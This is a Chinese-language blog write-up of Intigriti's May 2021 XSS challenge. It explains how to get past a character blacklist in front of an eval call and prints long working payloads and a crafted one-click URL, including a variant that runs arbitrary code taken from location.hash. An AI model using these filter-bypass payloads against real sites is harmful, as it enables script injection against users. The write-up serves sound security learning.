<!DOCTYPE html><html class="appearance-auto" lang="zh-TW"><head><meta charset="UTF-8"><title>Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼 - Huli's blog</title><meta name="description" content="Intigriti 是國外的一個 bug bounty 平台，每個月都會推出一個 XSS 挑戰，有大約一到兩週的時間可以去思考，目標是在特定網站上面執行 alert(document.domain.."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><meta name="image" content="https://life.huli.tw/img/intigritis-0521-xss-challenge-writeup-b859a65acc48/0__PWzGDbO1b8eyAan5.png"><meta name="original-source" content="https://life.huli.tw/2021/06/07/intigritis-0521-xss-challenge-writeup-b859a65acc48/"><link rel="canonical" href="https://life.huli.tw/2021/06/07/intigritis-0521-xss-challenge-writeup-b859a65acc48/"><meta property="og:locale" content="zh-TW"><meta property="og:type" content="article"><meta property="og:title" content="Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼 - Huli's blog"><meta property="og:description" content="Intigriti 是國外的一個 bug bounty 平台，每個月都會推出一個 XSS 挑戰，有大約一到兩週的時間可以去思考，目標是在特定網站上面執行 alert(document.domain.."><meta property="og:url" content="https://life.huli.tw/2021/06/07/intigritis-0521-xss-challenge-writeup-b859a65acc48/"><meta property="og:site_name" content="Huli's blog"><meta property="og:image" content="https://life.huli.tw/img/intigritis-0521-xss-challenge-writeup-b859a65acc48/0__PWzGDbO1b8eyAan5.png"><meta name="twitter:title" content="Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼 - Huli's blog"><meta name="twitter:image" content="https://life.huli.tw/img/intigritis-0521-xss-challenge-writeup-b859a65acc48/0__PWzGDbO1b8eyAan5.png"><meta name="twitter:description" content="Intigriti 是國外的一個 bug bounty 平台，每個月都會推出一個 XSS 挑戰，有大約一到兩週的時間可以去思考，目標是在特定網站上面執行 alert(document.domain.."><meta name="twitter:card" content="summary_large_image"><!-- Google Analytics --><!-- End Google Analytics --><link rel="icon" href="/images/lidemy_logo.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="Intigriti 是國外的一個 bug bounty 平台，每個月都會推出一個 XSS 挑戰，有大約一到兩週的時間可以去思考，目標是在特定網站上面執行 alert(document.domain) ，解出來之後把結果透過 Intigriti 平台回報，最後會隨機抽 3 個解掉的人得到他們自己商店的優惠券。
上個月的挑戰因為解出來的人不多，所以我有幸運抽到 50 歐元的優惠券，其實很划算，因為商店賣的東西其實都滿便宜的，我買了一件 t-shirt + 兩頂帽子再加國際運費，大概 45 歐元左右。
不過這種獎品就是靠運氣啦，還是解題好玩比較重要。
挑戰網址在這邊： https://challenge-0521.intigriti.io/

程式碼分析解題的第一步就是分析一下它的程式碼，先了解一下這整個題目的運.."><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Huli's blog" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Huli's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">點擊返回開頭</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">首頁</a></h3><h3 class="is-inline-block"><a href="/about">關於我</a></h3><h3 class="is-inline-block"><a href="/archives">文章列表</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">首頁</a></h3><h3 class="is-inline-block"><a href="/about">關於我</a></h3><h3 class="is-inline-block"><a href="/archives">文章列表</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%88%86%E6%9E%90"><span class="toc-text">程式碼分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E9%9D%A2%E5%95%9F%E5%8B%95"><span class="toc-text">全面啟動</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tagged-templates"><span class="toc-text">Tagged templates</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E4%B8%B2%E6%8B%BC%E6%8B%BC%E6%A8%82"><span class="toc-text">字串拼拼樂</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%B7%E8%A1%8C%E4%BB%BB%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC"><span class="toc-text">執行任意程式碼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%91%E6%88%B0%E6%9C%80%E7%9F%AD%E7%A8%8B%E5%BC%8F%E7%A2%BC"><span class="toc-text">挑戰最短程式碼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E7%B8%AE%E7%9F%AD"><span class="toc-text">再次縮短</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B5%90%E8%AA%9E"><span class="toc-text">結語</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Others"><i class="tag post-item-tag">Others</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</h1><time class="has-text-grey" datetime="2021-06-07T05:34:09.000Z">2021-06-07</time><article class="mt-2 post-content"><p><a target="_blank" rel="noopener" href="https://www.intigriti.com/">Intigriti</a> 是國外的一個 bug bounty 平台，每個月都會推出一個 XSS 挑戰，有大約一到兩週的時間可以去思考，目標是在特定網站上面執行 <code>alert(document.domain)</code> ，解出來之後把結果透過 Intigriti 平台回報，最後會隨機抽 3 個解掉的人得到他們自己商店的優惠券。</p>
<p>上個月的挑戰因為解出來的人不多，所以我有幸運抽到 50 歐元的優惠券，其實很划算，因為商店賣的東西其實都滿便宜的，我買了一件 t-shirt + 兩頂帽子再加國際運費，大概 45 歐元左右。</p>
<p>不過這種獎品就是靠運氣啦，還是解題好玩比較重要。</p>
<p>挑戰網址在這邊： <a target="_blank" rel="noopener" href="https://challenge-0521.intigriti.io/">https://challenge-0521.intigriti.io/</a></p>
<p><img src="/img/intigritis-0521-xss-challenge-writeup-b859a65acc48/0__PWzGDbO1b8eyAan5.png"></p>
<h3 id="程式碼分析"><a href="#程式碼分析" class="headerlink" title="程式碼分析"></a>程式碼分析</h3><p>解題的第一步就是分析一下它的程式碼，先了解一下這整個題目的運作為何。首頁這一頁看起來沒什麼東西，比較值得注意的只有一個網址是 <code>./captcha.php</code> 的 iframe，直接來看看裡面是什麼：</p>
<p>這邊有幾個 input，然後使用者按下送出時會把輸入的 c.value 丟到 eval 去執行，但有限定字元，不能使用： <code>a-df-z&lt;&gt;()!\=&#39;&quot;</code> ，在英文字母裡面只有 e 是可以用的。</p>
<p>因此這題的目標就很明顯了，是要繞過這個字元的限制，然後透過那個 eval 幫我們執行 <code>alert(document.domain)</code></p>
<h3 id="全面啟動"><a href="#全面啟動" class="headerlink" title="全面啟動"></a>全面啟動</h3><p>有關繞過字元限制，之前我有寫了一篇： <a target="_blank" rel="noopener" href="https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/">如何不用英文字母與數字寫出 console.log(1)？</a> ，沒想到這次就派上用場了。</p>
<p>舉例來說， <code>0/0</code> 可以產生 <code>NaN</code>，所以 <code> `$&#123;0/0&#125;`[1]</code> 就可以拿到字元 a。只要用類似的技巧，應該就可以產生出我們想要的所有字元。</p>
<p>但這題難的地方我覺得不在這，而是一開始在思考這題的時候腦袋容易打結，因為會分不太清楚什麼程式碼會直接被執行，什麼程式碼又不會。</p>
<p>舉例來說，就算費盡千辛萬苦拼出了目標字串好了，丟到 eval 去之後其實結果跟你想像中不太一樣，因為結構大概會像這樣： <code>eval(&#39;&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;+&quot;(1)&quot;&#39;)</code></p>
<p>最後的結果會是字串： <code>alert(1)</code> ，而不是直接執行 alert(1)，因為你在做的只是把想執行的程式碼拼出來，而 eval 只是幫你拼起來而已。那如果再把 eval 拼出來呢？</p>
<p><code>eval(&#39;&quot;eval(a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;+&quot;(1))&quot;&#39;</code></p>
<p>這樣也是沒用的，也只會出現字串的 eval 而已。之所以這樣不行，是因為你拼的東西是字串中的字串。舉例來說，請看下面這兩段程式碼：</p>
<pre><code>eval(&#39;alert(1)&#39;)
</code></pre>
<p>前者會跳出 alert，後者會輸出字串 alert。這就是因為後者是：「字串中的字串」。如果用字串拼接的方式，就一定會這樣。</p>
<p>所以如果需要執行程式碼的話，我們一定要有一些東西是不需要拼接的，在 JS 裡面可以把字串當作程式碼執行的有：</p>
<ol>
<li>eval</li>
<li>function constructor</li>
<li>setTimeout</li>
<li>setInterval</li>
<li>location</li>
</ol>
<p>這裡面符合我們需求的，就是 function constructor 了！</p>
<p>為什麼這樣說呢？因為我們可以不直接透過字串存取到這個東西！先簡單講一下 function constructor，就是 <code>Function()</code> 這個東西，可以動態產生函式。</p>
<p>然後 <code>Function</code> 就是 <code>Function.prototype.constructor</code>，所以可以利用 prototype chain 加上陣列來存取到：</p>
<p><code>[][&#39;constructor&#39;][&#39;constructor&#39;] === Function // true</code></p>
<p>有了這個之後，就可以動態建立 function 並且執行了！</p>
<p>像這樣：<code>[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()</code></p>
<p>那為什麼這樣子放進 eval 之後就可以呢？因為 <code>[]</code> 並不是用字串組成的，所以放進 eval 會是這樣： <code>eval(&quot;[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()&quot;)</code></p>
<p>這樣一來，就可以在 eval 裡面透過 function constructor 去動態執行程式碼了，這就是這個章節的標題「全面啟動」的意思，一層還有一層。</p>
<p>不過除了要找出替代字串以外，還有一個問題，那就是函式呼叫不能使用 <code>()</code> ，這該怎麼辦呢？</p>
<h3 id="Tagged-templates"><a href="#Tagged-templates" class="headerlink" title="Tagged templates"></a>Tagged templates</h3><p>有用過 React 中的 styled components 的話，對這個語法應該不陌生：</p>
<p>const Box &#x3D; styled.div`<br>  background: red;<br>`</p>
<p>其實 <code>styled.div</code> 是一個 function，然後用反引號來呼叫 function。沒錯，反引號也是可以呼叫函式的，但要注意的是參數的傳遞會跟你想的不太一樣。</p>
<p>直接做個簡單示範就知道了：</p>
<p>用反引號來呼叫函式的話，第一個參數會是一個陣列，裡面是所有一般的字串，隔開的標準是中間有 <code>$&#123;&#125;</code>，而接下來第二個參數以後都是你放在 <code>$&#123;&#125;</code> 裡的內容。</p>
<p>更多範例可參考：<a target="_blank" rel="noopener" href="https://pjchender.blogspot.com/2017/01/javascript-es6-template-literalstagged.html">[筆記] JavaScript ES6 中的模版字符串（template literals）和標籤模版（tagged template）</a></p>
<p>把我們上面的程式碼用反引號改寫會變這樣：</p>
<p>[][‘constructor’][‘constructor’]`${‘alert(1)’}```</p>
<p>但這樣的話如果你丟去執行，會發現有錯。因為根據我們上面所說的，這樣寫的話傳去 function constructor 的參數會是：<code>[&quot;&quot;], &#39;alert(1)&#39;</code> ，第一個參數是一個含有空字串的陣列。</p>
<p>而 function constructor 除了最後一個參數之外，其他都會被當作要動態新增的函式的參數，例如說 <code>Function(&#39;a&#39;, &#39;b&#39;, &#39;return a+b&#39;)</code> 就是：</p>
<p>function (a, b) {<br>  return a+b<br>}</p>
<p>所以第一個參數給空字串是行不通的，加一個變數就行了，例如說題目允許的 e 或者是 _：</p>
<p>[][‘constructor’][‘constructor’]`_${‘alert(1)’}``｀  </p>
<p>&#x2F;&#x2F; 產生出的函式<br>function anonymous(_,) {<br>  alert(1)<br>}</p>
<p>這樣就能順利執行程式碼了，因此最後剩下的就只有拼出 <code>constructor</code> 跟 <code>alert(document.domain)</code> 了</p>
<h3 id="字串拼拼樂"><a href="#字串拼拼樂" class="headerlink" title="字串拼拼樂"></a>字串拼拼樂</h3><p>除了我開頭提到的文章： <a target="_blank" rel="noopener" href="https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/">如何不用英文字母與數字寫出 console.log(1)？</a>之外， <a target="_blank" rel="noopener" href="https://github.com/aemkei/jsfuck/blob/master/jsfuck.js">jsfuck</a> 的程式碼也有很多可以參考的地方。</p>
<p>底下是我用的幾個：</p>
<p>1. `${``+{}}` &#x3D;&gt; “[object Object]“<br>2. `${``[0]}` &#x3D;&gt; “undefined”<br>3. `${e}` &#x3D;&gt; “[object HTMLProgressElement]“<br>4. `${0&#x2F;0}` &#x3D;&gt; “NaN”</p>
<p>我們可以從上面這些組合中，找到所有需要的字元。接下來只差最後兩個了，就是 <code>()</code> ，我們必須也用拼的拼出這兩個字元才行。</p>
<p>這要怎麼拿到呢？在 JS 裡面把 function 變成字串的話，就會是整個 function 的內容，像這樣：</p>
<p>`${[][‘constructor’]}`<br>=&gt; “function Array() { [native code] }”</p>
<p>可以透過這樣子拿到這裡面的 <code>()</code> 這兩個字元。</p>
<p>結合以上的技巧，我自己寫了一個簡單的小程式去產出最終的結果：</p>
<p>output(長度 851):</p>
<p>[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`${0&#x2F;0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${``+{}}`[6]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${``[0]}`[2]+`${``+{}}`[1]+`${``+{}}`[5]+`${``[0]}`[0]+`${e}`[23]+`e`+`${``[0]}`[1]+`${``+{}}`[6]+`.`+`${``[0]}`[2]+`${``+{}}`[1]+`${e}`[23]+`${0&#x2F;0}`[1]+`${``[0]}`[5]+`${``[0]}`[1]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}```</p>
<p>把上面這整串貼到網頁上的 input 然後按下提交，就會看到 alert 跳出來囉！</p>
<p><img src="/img/intigritis-0521-xss-challenge-writeup-b859a65acc48/0__ztgfHdjYQDJnAxUK.png"></p>
<p>做到這邊之後我就很開心地去送答案，結果得到了一個回覆，跟我說這是 self-XSS，提示我說可以多往 php 那邊去研究一點。</p>
<p>沒錯，我都忘記這是一個 self-XSS 了，因為需要自己把這串 payload 貼在 input 上面送出，就有點像是使用者必須自己把惡意程式碼貼過來一樣，這種通常沒辦法構成具有嚴重性的漏洞。</p>
<p>因此我就往 PHP 那邊去看，隨便試了一下發現 <code>c=xxx</code> 的內容會直接反映在 c.value 上，所以只要把上面那一串放到網址上面去就好了，變成：</p>
<p><a target="_blank" rel="noopener" href="https://challenge-0521.intigriti.io/captcha.php?c=%5B%5D%5B%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7Be%7D%60%5B18%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B13%5D%5D%5B%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7Be%7D%60%5B18%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B13%5D%5D%60_$%7B%60$%7B0/0%7D%60%5B1%5D+%60$%7Be%7D%60%5B21%5D+%60e%60+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%5B%5D%5B%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7Be%7D%60%5B18%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B13%5D%5D%7D%60%5B14%5D+%60$%7B%60%60%5B0%5D%7D%60%5B2%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7Be%7D%60%5B23%5D+%60e%60+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60.%60+%60$%7B%60%60%5B0%5D%7D%60%5B2%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B23%5D+%60$%7B0/0%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B5%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7B%5B%5D%5B%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7Be%7D%60%5B18%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B13%5D%5D%7D%60%5B15%5D%7D%60%60+%60">https://challenge-0521.intigriti.io/captcha.php?c=[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]`_${`${0&#x2F;0}`[1]%2b`${e}`[21]%2b`e`%2b`${e}`[13]%2b`${``%2b{}}`[6]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${``%2b{}}`[5]%2b`${``[0]}`[0]%2b`${e}`[23]%2b`e`%2b`${``[0]}`[1]%2b`${``%2b{}}`[6]%2b`.`%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${e}`[23]%2b`${0&#x2F;0}`[1]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]}```</a></p>
<p>這樣子使用者點了網址之後 payload 就會自動填好，只要按按鈕就可以觸發。於是我們把 self-XSS 變成了 one-click XSS，點個按鈕就會中招。</p>
<p>做到這邊其實就通過這題了，但因為還有時間，所以我還想再研究更多東西。</p>
<h3 id="執行任意程式碼"><a href="#執行任意程式碼" class="headerlink" title="執行任意程式碼"></a>執行任意程式碼</h3><p>只是執行固定的程式碼不太好玩，有沒有可能執行任意程式碼？像是這種任意程式碼執行通常都會透過幾個方法把程式碼帶進去，例如說：</p>
<ol>
<li>window.name</li>
<li>iframe + top.name</li>
<li>location.hash</li>
</ol>
<p>這邊前兩者都需要自己再做另一個網頁，只有 location.hash 不需要，因此這邊就先以這個作法為主吧！</p>
<p>我們需要湊出的字串是：</p>
<p>[][‘constructor’][‘constructor’]`_${‘eval(location.hash.slice(1))’}```</p>
<p>這樣只要讓網址最後面是：<code>#alert(document.domain)</code> ，就可以達成一樣的效果了。</p>
<p>新的字元組合，缺少的只有兩個：v 跟 h。</p>
<p>這兩個其實不太好找，因為比較好找的已經都被我們找完了。那還有哪裡可以找呢？</p>
<p>首先是 v 的部分，其實可以把原生的 function 變成 string，就能拿到 <code>[native code]</code> 這個字串。但是在 Chrome 上與 Firefox 上的輸出不太一樣，以 RegExp 為例，</p>
<p>Chrome 的輸出是： <code>function RegExp() &#123; [native code] &#125;</code><br>Firefox 的輸出是： <code>function RegExp() &#123;\n [native code]\n&#125;</code></p>
<p>Firefox 的輸出會換行而 Chrome 不會，這就造成了字元 index 的差異，所以沒辦法跨瀏覽器取得 v 這個字。不過我們先不管這個，先來看 h 好了。</p>
<p>h 一樣也是不容易取得，但如果我們能組出： <code>17[&#39;toString&#39;]`36` </code> ，其實就能拿到 h。</p>
<p>因為上面的程式碼就是把 17 這個數字轉成 36 進位，這樣就可以拿到 h，因為 h 是第 8 個英文字母（9 個數字 + 第 8 個英文字母 &#x3D; 17）。</p>
<p>那這個大寫的 S 怎麼拿呢？String constructor 可以拿到：</p>
<p>``[‘constructor’] + ‘’<br>&#x2F;&#x2F; output<br>&#x2F;&#x2F; “function String() { [native code] }”</p>
<p>而且一旦我們可以用 toString 的這個技巧，其實任何小寫英文字母都可以拿到了，當然也包含前面所說的 v。</p>
<p>詳細過程我就不示範了，把程式改一下就好，最後的結果是（1925 個字）：</p>
<p>[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`e`+31[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0&#x2F;0}`[1]+`${e}`[21]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${e}`[21]+`${``+{}}`[1]+`${``+{}}`[5]+`${0&#x2F;0}`[1]+`${``+{}}`[6]+`${``[0]}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`.`+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0&#x2F;0}`[1]+`${e}`[18]+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`.`+`${e}`[18]+`${e}`[21]+`${``[0]}`[5]+`${``+{}}`[5]+`e`+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+1+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}```</p>
<h3 id="挑戰最短程式碼"><a href="#挑戰最短程式碼" class="headerlink" title="挑戰最短程式碼"></a>挑戰最短程式碼</h3><p>可以執行任意程式碼之後，還有什麼可以玩呢？那就是挑戰最短的程式碼！試著把程式碼弄到最短看看。</p>
<p>可以想到的有：</p>
<p>1.不要用 <code> ``[0]</code>拿到 undefined，而是用 <code>e[0]</code>，可以省一個字元<br>2. <code> ``+&#123;&#125;</code> 來拿 <code>[object Object]</code> 其實多此一舉，用 <code>&#123;&#125;</code> 就好，省了三個字<br>3. 有可以用到 e 的地方盡量用到 e，因為程式碼會最少</p>
<p>再來我們本來是用 <code>[][&#39;constructor&#39;]</code> 來拿到 function，這樣有點太長了，可以用很科學的方式來找出最短的：</p>
<p>找出來的冠軍是 <code>some</code>，可以拿來取代本來使用的 <code>[][&#39;constructor&#39;]</code> 。</p>
<p>最後呢，因為我們不需要執行任意程式碼了，所以用 <code>alert(document.domain)</code> 就好，至於 <code>eval(name)</code> 的話雖然乍看之下更短，但因為要拿到 v 不容易，所以其實會花費更多字元。</p>
<p>底下是產生出來的結果，長度 466 個字：</p>
